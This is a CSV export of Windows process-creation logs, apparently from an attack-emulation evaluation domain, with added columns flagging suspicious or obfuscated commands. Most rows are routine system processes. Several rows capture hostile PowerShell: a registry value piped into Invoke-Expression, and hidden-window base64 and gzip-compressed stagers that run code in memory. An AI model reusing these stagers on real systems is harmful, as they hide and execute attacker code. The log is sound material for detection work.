ProcessName,SubjectUserName,@timestamp,host,Hostname,EventID,SubjectLogonId,ProcessId,LogonType,TargetLogonId,WorkstationName,IpAddress,TargetUserName,PrivilegeList,CommandLine,ParentProcessName,NewProcessId,NewProcessPath,NewProcessName,ParentProcessNameOnly,suspicious_office_spawn,suspicious_svchost,exit_time,duration_seconds,obfuscated_command
,LOCAL SERVICE,2020-05-02 03:21:06.191000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e5,0x1c20,,0x0,,,-,,C:\windows\system32\Windows.WARP.JITService.exe db4a1097-b484-4973-bbf2-a04208ecd4d4 S-1-15-2-3624051433-2125758914-1423191267-1740899205-1073925389-3782572162-737981194 S-1-5-21-1830255721-3727074217-2423397540-1107 524,C:\Windows\System32\svchost.exe,0x1c84,C:\windows\system32\Windows.WARP.JITService.exe,windows.warp.jitservice.exe,svchost.exe,False,False,,,False
,SCRANTON$,2020-05-02 03:21:08.267000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x1cf8,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,,,False
,pbeesly,2020-05-02 03:21:08.278000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x13069a,0x1cf8,,0x0,,,-,,C:\windows\system32\MicrosoftEdgeSH.exe SCODEF:6208 CREDAT:9730 APH:1000000000000004 JITHOST /prefetch:2,C:\Windows\System32\RuntimeBroker.exe,0x1d2c,C:\windows\system32\MicrosoftEdgeSH.exe,microsoftedgesh.exe,runtimebroker.exe,False,False,,,False
,SCRANTON$,2020-05-02 03:21:08.282000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,"""C:\Windows\System32\MicrosoftEdgeCP.exe"" -ServerName:Windows.Internal.WebRuntime.ContentProcessServer",C:\Windows\System32\svchost.exe,0x1d4c,C:\Windows\System32\MicrosoftEdgeCP.exe,microsoftedgecp.exe,svchost.exe,False,False,,,False
,SCRANTON$,2020-05-02 03:21:08.297000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca",C:\Windows\System32\svchost.exe,0x1e34,C:\windows\system32\backgroundTaskHost.exe,backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:22:09.719000+00:00,61.422000000000004,False
,SCRANTON$,2020-05-02 03:21:09.349000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x1e80,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,,,False
,SCRANTON$,2020-05-02 03:21:11.646000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x1444,,0x0,,,-,,"""C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler.exe""",C:\Program Files (x86)\Google\Update\GoogleUpdate.exe,0x1ef0,C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler.exe,googlecrashhandler.exe,googleupdate.exe,False,False,2020-05-02 03:21:14.070000+00:00,2.424,False
,SCRANTON$,2020-05-02 03:21:11.646000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x1444,,0x0,,,-,,"""C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler64.exe""",C:\Program Files (x86)\Google\Update\GoogleUpdate.exe,0x1ef8,C:\Program Files (x86)\Google\Update\1.3.35.452\GoogleCrashHandler64.exe,googlecrashhandler64.exe,googleupdate.exe,False,False,2020-05-02 03:21:12.859000+00:00,1.213,False
,SCRANTON$,2020-05-02 03:21:11.651000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,C:\windows\System32\mobsync.exe -Embedding,C:\Windows\System32\svchost.exe,0x1f04,C:\windows\System32\mobsync.exe,mobsync.exe,svchost.exe,False,False,2020-05-02 03:21:22.151000+00:00,10.5,False
,SCRANTON$,2020-05-02 03:21:27.762000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s Appinfo,C:\Windows\System32\services.exe,0x20c0,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,,,False
,SCRANTON$,2020-05-02 03:21:27.764000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x20c0,,0x0,,,-,,consent.exe 8384 306 000001E691026060,C:\Windows\System32\svchost.exe,0x20dc,consent.exe,consent.exe,svchost.exe,False,False,2020-05-02 03:21:31.715000+00:00,3.951,False
,SCRANTON$,2020-05-02 03:21:31.716000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0xb08,,0x1305dc,,,pbeesly,,"""C:\Windows\System32\hostui.exe"" ",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x2104,C:\Windows\System32\hostui.exe,hostui.exe,powershell.exe,False,False,2020-05-02 03:21:31.721000+00:00,0.005,False
,SCRANTON$,2020-05-02 03:21:31.716000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc,C:\Windows\System32\services.exe,0x210c,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,,,False
,pbeesly,2020-05-02 03:21:31.717000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x1305dc,0x2104,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\hostui.exe,0x2144,\??\C:\windows\system32\conhost.exe,conhost.exe,hostui.exe,False,False,2020-05-02 03:21:31.721000+00:00,0.004,False
,SCRANTON$,2020-05-02 03:21:31.719000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s seclogon,C:\Windows\System32\services.exe,0x2168,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,,,False
,SCRANTON$,2020-05-02 03:21:31.721000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2104,,0x13069a,,,pbeesly,,"powershell.exe -c ""Get-ItemPropertyValue 'HKLM:\\SOFTWARE\Javasoft' 'value Supplement' | Invoke-Expression""",C:\Windows\System32\hostui.exe,0x218c,powershell.exe,powershell.exe,hostui.exe,False,False,2020-05-02 03:21:32.215000+00:00,0.49400000000000005,False
,pbeesly,2020-05-02 03:21:31.721000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x13069a,0x218c,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x21a4,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:21:32.215000+00:00,0.49400000000000005,False
,pbeesly,2020-05-02 03:21:31.728000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x13069a,0x218c,,0x0,,,-,,"""C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnACcASAA0AHMASQBBAE8ASAA4AFUAMQAwAEMAQQA3AFYAVwBlADIALwBhAFMAQgBEAC8AdQA1AEgAeQBIAGEAdwBLAEMAVgB0AEgAdwBFADUASQBTAGkASgBWAE8AaAB0AHMATQBBAEUAQwBHAEoAdABBAGkAcQBxAE4AdgBkAGkAYgByAEIALwBZAGEAeAA3AHAAOQBiAHYAZgBMAEsAKwBtAGEAbABxADEASgA1ADAARgA4AHUANQA0AG4AcgArAFoAbgBkAGwANQBIAHIAbQBNAHgASgBIAHcAOQBHAEkASwBYADAANQBQADMAdgBWAFIAaQBrAEoAQgBMAEcAeAB1AGgAeQBXAGgANABDADYAawBkACsAKwBBAFcAbABnAHUAVgBlAEcAagBJAEQANgBvAFMAZABLAEkAUQAwAFMAaQAyAGMAMQBOAFAAVQA5AFQASABMAEgAZAB2AHQAegBFAFQATQAwAHkASABEADUAUwBnAGoATgBSAEUAdgA0AFIAeABnAEYATwA4AGQAbgBkADQAeABOADIAbQBmAEIARgBLAEgAdwB1AE4AMgBuADgAaQBPAGkAZQBiAFYATgBIAGIAbwBDAEYATQB6AFgAeQArAEwAZABPADcAQwBMAHUAUwBkAGwASwBLAEcARgBpADgAZABPAG4AbwB2AFIAdwBwAHMAegBLACsAaQBKAEgATgBCAE8ATAAxAGkAWgBqAE8AQwB4ADcAbABCAFkAbAA0AGEAdgBFAEQAWQA0ADIAQwBSAGEATABYAGUASwBtAGMAUgBiAFAAVwBYAGwATQBvAG8AdgB6AHMAaAAxAGwAYQBJADUANwBvAEcAMgBKAHUANQBnAEYAcwBaAGMAVgBKAFEAZwBDAGYAaQBsAG0AZQBSAG8ASgBQAEIAdwB1AHYALwBzAHEARgBtAEgAWgBUADIATgBYADkAYgB3AFUAWgAxAG0AeABKAEQAeAB3AHoAUQArAHoAMgBkAC8AaQB3ADkANwBzAE0ASQA4AFkAQwBYAEgAWgBqAEIAaABPADQAOABUAEMANgBaAEsANABPAEMAdQAzAFUATwBSAFIAUABNAFQAegBHAFUAaABaAEwAQwBXAFIAUAA1AE0AawBZAEYAdgBHAHoAMQBnAHMAUgBEAG0AbABKAGUARgBQADEASQBnADkAdgBEAHEAQQA5AHIAdABDADQAbQBzAGgANABPAHEAegBWAEMAcABCAEUAbgA4AE0AcwB4AHQANwBPAGMAVQA3AHcAZQBJAGIAZgB2AEsAOABTAC8ARABzAGMAZwArAG8AZgBUADAAOQBPAFQAMgBaAEgANgBwAGsATQAzAHAAZABKAEwAQgA2ADkANwBCAGQAWQAzAEIATQA3AE0AYwBaADIAWABKADkARgBPAFMAUwAwAEEAVQBiAGkATQBYAHAAQgByAGEARgBVAFoAcABqAGEAWABhAEUAVgBTAGoAawA3AGQATABQAHAAWgBVAEQASwB6AEQARwBzAHYATABaAEEAdABxAEQARQB4AE4AdgBCAGoATAA3AFQAQgBiAG8AawBsAE4ALwBYAG8AOABOAFAAQwBjAFIAYgBtAHcAaQBGAEIATAAzAFUASABMAGkAVwArAGoAaQBPAGMAWABiADgATQBvAEgAdABoADcANABKAEIAYgAzAEgANwBEAFgAdwBCAFQANwBpAEgASABBAGUASgBKAC8ARQBOAE4ARAB3AG8ANgB5AFcAawA2AG8AaAAxAFAAVgBoAFEAeABsADQAQgBVAGsAVAAvAHIAZQBtAFYAMABPAHgASwBJAFoAZABYAEUASQBBAE8AMwAyAFUASABXAEYATwBSAFEANgBQAG4ARAB2AGkAMwB0AHoAcwBNADcAMwB3AEYAUwBzAFUANQBSAGwASgBhAEcAZgB3ADAAbAB6AFMANABLAEYARQBjAFYAZQBTAFYAQwBqAGoATwB3AC8AcQBUAG0ATAB0ADgAdgBpAE4AMwBlADcATwBXAFgARQBSAFIAawA3AHEASgB0AEoATwB4AFQAMwAxAHUAcAB4AGwATABFADAAZAB5AEYAagBFAFAAbgBJAFMAcgBCAEwARQBPAFYAQQBsAEkAUQBXADgAYgBDADIAcwBZAGgALwBzAEYAcAA4AEUANABZADYAbwBoAFQASwBIAHoAUQB0AEkAUQAxAEEANABlAEYAYgBqAE4AZABCAEMAZwA1AEMAegBxAFcAeQBoAFoAawBaAEoAaABTAEgAdwBMAEUAOQA3AGcAWgBGAFAAaAB6AHUAZgBZAGwAdgB5AHcAYgA1ADIAQwB0ACsANwA5ADIAaABnAG4AZgBsAHkAbABFADQAaABQAC8ASwBOADAAaQB0AFIAVwBOAFcARQBoAHkAUwBNAHUAZwBaAEgATgBGAHQAKwBmAHcAWAAyADYAKwBhAEIAWABoAFIAVAAvAEUAKwBBACsATABoAFQARAB4AG8ARwA4AFoAcgB1AFUAQgBRAEwAVQBwADUATABlADQAUgAyAGMAYQBmAE0AbwBqAGQAUwBPAE4AUQBRAHgAbQArAHEAdQA0AGEAZwAvAGkAKwBvAHAAUABHAFoAYgA4AFIAdgA2AGoAdwA2AE0AWgB3ADQARwBpAFcANwBVAHoATgByAHQAZQBtAGwAcwBtAHMAaQBVADQANgBkAGgAQwBZAFIARABGADkAMgBHADkAcwAzAGUAOAB6AE8AYgBrAGQAagBWAHAAdABxADkARgBTADAAOABZADYAbQBLAHQAbQBaAHUAbwB0AGIAVABOAFEATgBOAFYAdABrAFEAOQBPAFcANwBOAHQAawBDAFAAMQB6AHUAQgBwAGIAYQBxAGUARgB2AHIAMwAvAHEAUwArAE0AdgB2AEIAdgBRAG0ARwA2AGgAMwBmADkATwBHAHQAbQBZAEcAcgB5AFYAUABaADEAMgBTAGoAMwByAEcAMABRAEMAZQB5ADYAbAB1AEQAMQBxAEMAcQBUAE0AMQBLAGoAVwByAGsAeABUAEkAdAB0AFQAVQArADIAagB2AGEAMABhAHYAVgAxAHYAMQA2AHAAUABhADYAYgBUAFUAdwA3AGoAeABEAE8AVABlADIAOABzADkAYwBmAHYAcgBjADcARABUADAANwBkADcAbAArADgARQBrADAANABrAE8AZABuAFIAagBNAG4AQQBDAFAASABZAFMAYgBhAHcAYgAwADQARwBUAG0AUAA1AGYASwAzAC8AZwBkAEMAcABWAEkAOQBDAEEAYgBwAEoAMQBKADcARQBxADgAQwBnAEsANABNAEIARwAxAHUAUABsAEIAUgBwAGYASgBvACsAaABJAHcATgBHAFkAOAB1AE0AQQBzAHUAZAAxADAAYwB0AE4AOQBRAHEARgBjAGQAVwBlAGkAYgBCAHgAbQBqADgATABLADkAWAB1AHIAegBlAE8ARAAyAFEAaQBhACsAYwBLAEkAdwA0AHIARwBxAC8ANABsAHkAcABLADcANQBhADMANAAzAE0AdgBEAHUAYQBWAEQAdABQAGEAdAA1AFQATgBRAFMANgBOAE4AQwBsADUAaQBzAGQAOABOAC8ASgBJAHAALwBMAEoALwBkAGsAVwBtAGsAZQA1AFIAcwAxAHYAbABwADYAegArAHYANgA0ADIAZwBnAFQAdwAyADMAYQBvAGQAVABOAHIAaAB3AG4AcQB4ADcAZQA0ADMATwA5AFgAUAB2AHAAVwBkADIAbQA4AHkAZQBqAGgAeQA3ACsAMABKAEQAUwAxAGQAUQA3AHoAegBRAGUAMABaAHQAMAB3AHUAaABiADQAUwAyAGIARAB2AFgAZwB6AHQANwBPAE0ASgBHADkAdwBJADkARABhAHMAVABYAHoATwBKAHkAMwAwADMASgBoAHgAagBXAHkAWgBWAHQAWABIAHIAQgAxAHYARAAyAGcAQgBpAGEANgA5AHIAbgBkAFMAeABxAGgAOABxADEAdwA3AHcAVABoAGQAMQBlAG0AMgBTAHUAYgBGAG8ASwBZAG0ARgBUAEIAVgBLAFIAMgBzAFQAcgBDADAAMAB3AEIAUAA4AFYAbwBiAEoAMQBkAEYAdgAwAEsAbgBhAFMAcwBMADUAZQAxADIAWAA4AHYALwBJAGwAcQBQAFcAaQBzAGoATgBaAG0AdABaAFUAUwBiADMAcQBqAGUAOABOAHQAZQAxAHAAcQBrAEQAUgBDAEMAdgAxAHgAcgAzAC8AawBIAGUANgBsAGYANgBuAHQAcABKAEYAMwBuAGcAYwBKAEsAdAAwAE0AWABBAFMATgByAEUAYQAyAG4AVgBRAEEAUABmAEEARABaADEASwB6AGQASgBqAEQANAA5AHkAcgBWADcAWQBJAGUAMABMACsARgBmAHMAMABuADcALwBCAGwAcwBxAHEAcQAvADkAWABWAE8AMgAzAGwAdwBPAHkAYgBZADMATABMAHoAdQBQAHoAYQB3AE8AZQAxAG0ASQBXAG8AbwAwAEUAOQByAHEAcgBnAGwAOQBlAGUAcgBKAFIAZwBvAFIAcQBVAFkANwBCAGkAcQBEADIAdQBYAE4AcwBmADMALwBQAGoAQwBPAGUAeAA0AEcARwA1AFEAMQA4AGQAdABKACsATgB4AFMANQBLAHMAdwBCAFIATwBJAEEAdwA4AEEANwB0AHoAbwBoAFQAWQB6AC8ARgArAGoASABoAEUAcQBMAEkANwB6AHoAUABPAEkAMAB3AGgAVgBzAEQAMwBDAHMATwBqAFUATwBsAE4ASABiADUAQQBJAFYAeABCADYATgA3AE4AMQBEADUAZgBMAGQAaABlAFgASAArADUAawBvAFMAagBvAHoAUwB0ADcAbAA2AEkATgAzAGMAVABNAEYARgA2AEUAUABiAFoAbABIAHUANABNAGgAbgBRAFUAbABlAFgAOABnAHkAagBFAHAANQBYAFoAVQBoAHkATgArAFAAcQB4ADQAbgBHADMARwBuAHEAOABSAG4ANwBRADYAYQBvADMAcQA2AFYAUwAvAHgATABsAFcAWQB0ADYANAAvAC8ASwArAFkANwBWAHQAagBBAEMALwB2ADEANQBoADkAbwAvADMAaQA2ADIALwBoAEsASgBmADIARQBmADkAQQAvADUANwB3AFIANgBEACsAYQBlAEIAagBSAEIAZwB3AFcAdABEAFkASwBkADUAZABLAGQANgBLAGYAMQA4AGUAcgArADUAYQBQAEMAVwBRACsALwBuACsANABWAGYAbAB1ADUAeQBkADkAZQBBAEsAZABuAHIAeQBMAC8AdwBMAHYAcwAyAFIAQwB3AEEAQQAnACcAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA=",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x2200,C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,powershell.exe,False,False,2020-05-02 03:21:32.215000+00:00,0.48700000000000004,True
,pbeesly,2020-05-02 03:21:32.214000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x13069a,0x2200,,0x0,,,-,,"""powershell.exe"" -nop -w hidden -c &amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('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'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x2250,powershell.exe,powershell.exe,powershell.exe,False,False,,,True
,pbeesly,2020-05-02 03:21:32.214000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x13069a,0x2250,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x2258,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,,,False
,SCRANTON$,2020-05-02 03:21:50.078000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x498,,0x0,,,-,,C:\windows\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2),C:\Windows\System32\svchost.exe,0x2340,C:\windows\System32\dsregcmd.exe,dsregcmd.exe,svchost.exe,False,False,2020-05-02 03:21:50.101000+00:00,0.023000000000000003,False
,SCRANTON$,2020-05-02 03:21:50.078000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2340,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\dsregcmd.exe,0x2348,\??\C:\windows\system32\conhost.exe,conhost.exe,dsregcmd.exe,False,False,2020-05-02 03:21:50.103000+00:00,0.025,False
,SCRANTON$,2020-05-02 03:21:55.931000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x498,,0x1305dc,,,pbeesly,,taskhostw.exe $(Arg0),C:\Windows\System32\svchost.exe,0x2394,taskhostw.exe,taskhostw.exe,svchost.exe,False,False,2020-05-02 03:21:55.935000+00:00,0.004,False
,NASHUA$,2020-05-02 03:21:55.982000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,NASHUA$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x22c8,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:24:04.126000+00:00,128.144,False
,NASHUA$,2020-05-02 03:22:02.034000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x3e4,,,NASHUA$,,C:\windows\system32\sppsvc.exe,C:\Windows\System32\services.exe,0x2320,C:\windows\system32\sppsvc.exe,sppsvc.exe,services.exe,False,False,2020-05-02 03:22:33.654000+00:00,31.62,False
